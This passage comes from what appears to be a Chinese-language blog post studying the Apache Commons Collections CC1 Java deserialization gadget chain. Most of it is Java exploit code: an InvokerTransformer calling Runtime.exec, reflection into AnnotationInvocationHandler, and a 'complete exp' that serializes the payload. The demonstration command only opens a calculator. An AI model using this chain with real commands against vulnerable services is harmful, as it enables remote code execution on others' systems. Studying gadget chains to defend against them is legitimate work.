class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br><span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        .transform(runtime);<br></code></pre></td></tr></table></figure><h3 id="解决Runtime不能反序列化"><a href="#解决Runtime不能反序列化" class="headerlink" title="- 解决Runtime不能反序列化"></a>- 解决Runtime不能反序列化</h3><p>找到突破口之后，我们要想<code>readObject</code>方法是反序列化才会使用，但是<code>Runtime</code>没有实现<code>SSerializable</code>方法，因此不能实现反序列化。</p><p>如何解决？Class类都是可序列化的，因此我们序列化<code>Runtime.class</code>。</p><p>查看源码发现，<code>Runtime</code>类的构造方法都是私有的，只有一个静态方法<code>getRuntime</code>返回<code>currentRuntime</code>，用到的是单例模式。因此只能反射调用<code>getRuntime</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// InvokerTransformer 传入形参会通过反射进行调用</span><br>Class&lt;Runtime&gt; runtimeClass = Runtime.class;<br><span class="hljs-type">Method</span> <span class="hljs-variable">runtimeClassMethod</span> <span class="hljs-operator">=</span> runtimeClass.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>);<br><span class="hljs-type">Runtime</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> (Runtime) runtimeClassMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>runtimeClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(r, <span class="hljs-string">&quot;calc&quot;</span>);<br></code></pre></td></tr></table></figure><ul><li>首先获取Runtime.class这个class对象</li><li>然后调用<code>getRuntime</code>静态方法获取当前的<code>runtimeClassMethod</code>方法。</li><li>然后使用<code>runtimeClassMethod</code>方法类去<code>invoke</code>，即调用<code>getRuntime</code>方法，<code>invoke</code>方法第一个参数是类的实例对象，第二个参数是这个方法执行的参数。因为需要<code>Runtime</code>类才能调用这个私有方法，因此第一个参数是我们上面获取到的对象。</li></ul><h2 id="3-2-TransformedMap类："><a href="#3-2-TransformedMap类：" class="headerlink" title="3.2 TransformedMap类："></a>3.2 TransformedMap类：</h2><p>上面我们查找到了调用<code>TransformedMap</code>类中的<code>checkSetValue</code>方法，我们接着网上找，发现<code>AbstractInputCheckedMapDecorator</code>类中的内部类<code>MapEntry</code>的<code>setValue</code>方法调用了他，只要我们执行map的<code>setValue</code>将我们上面的<code>Object Input</code>传入进去就可以执行了，如下：</p><p><img src="/./../blog_image/image-20231026162650565.png" alt="image-20231026162650565"></p><p>发现是<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>的<code>setValue</code>方法。</p><p><img src="/./../blog_image/image-20231026162832837.png" alt="image-20231026162832837"></p><p>编写构造链如图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TransformedMapExp02</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// TransformedMap 这个类继承AbstractInputCheckedMapDecorator类 重写了checkSetValue 方法</span><br>    <span class="hljs-comment">// AbstractInputCheckedMapDecorator 类中的一个匿名MapEntry类调用setValue方法 回调用checkSetValue</span><br>    <span class="hljs-comment">// 尝试调用MapEntry的set方法</span><br>    <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getRuntime();<br>    <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>    <span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;<br>        entry.setValue(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续网上查询，查找谁调用了<code>setValue()</code>方法，发现存在许多方法，我们的目的是查找<code>readObejct</code>方法，在<code>readObejct</code>方法中调用<code>setValue()</code>方法既可以实现放序列化，查找到<code>sun.reflect.annotation</code>包中的<code>AnnotationInnvocationHandler</code>的<code>readObejct</code>方法调用了<code>AbstractInputCheckedMapDecorator</code>中的<code>setVale()</code>方法。</p><p><img src="/./../blog_image/image-20231026162954726.png" alt="image-20231026162954726"></p><p>至此调用链就清楚了：</p><p><img src="/./../blog_image/image-20231026170328365.png" alt="image-20231026170328365"></p><p><code>readObjetc</code>中的判断如下：</p><p><img src="/./../blog_image/image-20231026172019179.png" alt="image-20231026172019179"></p><ol><li>将我们的map的key设置为一个注解中的成员变量，如<code>Target</code>注解存在一个成员变量<code>value</code>。</li></ol><p><img src="/./../blog_image/image-20231026172425292.png" alt="image-20231026172425292"></p><p>然后创建一个代理对象，去调用了我们熟悉的<code>AbstractInputCheckedMapDecorator</code>的<code>setValue</code>方法。</p><p><img src="/./../blog_image/image-20231026172616941.png" alt="image-20231026172616941"></p><p>因此思路在于如何修改这个<code>parent</code>对象的属性，可以没有办法。查找其他<code>transform</code>发现<code>ConstantTransformer</code>中<code>transform</code>不管输入什么都是调用他的成员变量，因此可以只要我们在创建的时候将<code>Runtime.class</code>赋值给他的成员变量，然后去调用<code>transform</code>方法就会返回<code>Runtime.class</code></p><h2 id="3-3-完整exp"><a href="#3-3-完整exp" class="headerlink" title="3.3 完整exp:"></a>3.3 完整exp:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TransformedMapExp03</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-string">&quot;bb&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-comment">// 发现是AnnotationInvocationHandler类中调用了readObejct方法，</span><br>        <span class="hljs-comment">// readObject方法中会使用到setValue方法</span><br>        <span class="hljs-comment">// 但是AnnotationInvocationHandler这个类不是public的</span><br>        <span class="hljs-comment">// 1.使用反射去获取这个类</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aClassDeclaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        aClassDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 创建对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">aObejct</span> <span class="hljs-operator">=</span> aClassDeclaredConstructor.newInstance(Override.class, transformedMap);<br>        <span class="hljs-comment">// 执行反序列化</span><br>        serialize(aObejct);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;a.bin&quot;</span>));<br>        stream.writeObject(o);<br>        stream.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;a.bin&quot;</span>));<br>        stream.readObject();<br>        stream.close();<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="4-疑惑："><a href="#4-疑惑：" class="headerlink" title="4. 疑惑："></a>4. 疑惑：</h1><h2 id="4-1-疑惑点一：为什么要加上new-ConstantTransformer-Runtime-class-？"><a href="#4-1-疑惑点一：为什么要加上new-ConstantTransformer-Runtime-class-？" class="headerlink" title="4.1 疑惑点一：为什么要加上new ConstantTransformer(Runtime.class)？"></a>4.1 疑惑点一：为什么要加上new ConstantTransformer(Runtime.class)？</h2><p>开始我们知道使用chainedTransformer中的<code>transfomer</code>方法可以方便我们去调用，我们传入多个对象就会不断循环去调用这些对象的<code>transfomer</code>方法。</p><p>如图：</p><p><img src="/./../blog_image/image-20231026174119500.png" alt="image-20231026174119500"></p><p>我们只要将我们需要传入的<code>Runtime.class</code>就可以实现我们的链路了。</p><p><img src="/./../blog_image/image-20231026174331664.png" alt="image-20231026174331664"></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul><li>视频：<a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=a015846fd4dda3664f6a3becf9028a53">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></li><li>博客：<ul><li><a href="https://www.cnblogs.com/h0cksr/p/16189755.html">java反序列化(三)CommonsCollections篇 – CC1 - h0cksr - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/weixin_45808483/article/details/122743960">【精选】Java安全入门(二)——CC链1 分析+详解_cc1利用链_ErYao7的博客-CSDN博客</a></li><li><a href="https://xz.aliyun.com/t/12669">JAVA安全初探(三):CC1链全分析 - 先知社区 (aliyun.com)</a></li><li><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链 | Drunkbaby’s Blog (drun1baby.top)</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
